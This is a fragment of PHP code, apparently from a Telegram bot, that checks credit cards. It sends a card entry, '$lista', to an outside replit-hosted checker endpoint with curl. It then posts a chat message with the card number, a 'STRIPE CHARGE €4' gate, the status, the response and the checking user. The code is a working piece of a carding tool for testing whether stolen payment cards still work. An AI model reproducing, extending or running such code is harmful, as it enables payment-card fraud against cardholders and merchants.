...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://Cat-Evil-CHK-SK.catevil.repl.co/sendnudez/Hcaptcha/chk.php?lista='.$lista.'');
...
$time_end = microtime(true);
 ...
 editMessage($chatId, "<b>CAT EVIL CORP ✅- Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: STRIPE CHARGE €4%0A[ϟ] CC: <code>$lista</code>%0A[ϟ] STATUS: $pass%0A[ϟ] RESPONSE: $msg%0A[ϟ] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
}
